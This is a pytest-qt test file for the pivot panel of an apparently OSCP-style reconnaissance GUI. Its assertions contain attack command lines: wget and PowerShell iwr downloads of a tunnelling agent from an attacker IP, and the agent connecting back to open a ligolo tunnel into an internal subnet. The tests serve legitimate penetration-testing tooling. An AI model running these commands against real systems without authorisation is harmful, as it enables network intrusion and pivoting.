from pathlib import Path

from pytestqt.qtbot import QtBot

from oscprecon.gui.widgets.pivot_panel import PivotPanel
from oscprecon.models import Target
from oscprecon.profile import Profile


def _flat_commands(panel: PivotPanel) -> str:
    from PySide6.QtWidgets import QPlainTextEdit

    return "\n".join(w.toPlainText() for w in panel._steps_host.findChildren(QPlainTextEdit))


def test_pivot_panel_builds_steps_and_switches_os(qtbot: QtBot) -> None:
    panel = PivotPanel()
    qtbot.addWidget(panel)
    panel._ip.setText("10.10.14.9")
    panel._routes.setText("172.16.1.0/24")

    # default: Linux agent delivery + run
    linux = _flat_commands(panel)
    assert "./agent -connect 10.10.14.9:11601 -ignore-cert" in linux
    assert "tunnel_start --tun ligolo" in linux
    assert "wget http://10.10.14.9:8000/agent" in linux  # transfer spelled out

    # switch to Windows → PowerShell delivery + agent.exe
    panel._os_windows.setChecked(True)
    win = _flat_commands(panel)
    assert "agent.exe -connect 10.10.14.9:11601 -ignore-cert" in win
    assert "iwr -Uri http://10.10.14.9:8000/agent.exe" in win


def test_pivot_panel_seeds_routes_from_profile(qtbot: QtBot, tmp_path: Path) -> None:
    from oscprecon.models import DiscoveredHost

    prof = Profile.create(tmp_path, "p", Target(ip="10.10.110.100"))
    prof.discovered_hosts.append(DiscoveredHost(ip="172.16.1.5", subnet="172.16.1.0/24"))
    panel = PivotPanel()
    qtbot.addWidget(panel)
    panel.set_profile(prof)
    assert "172.16.1.0/24" in panel._routes.text()
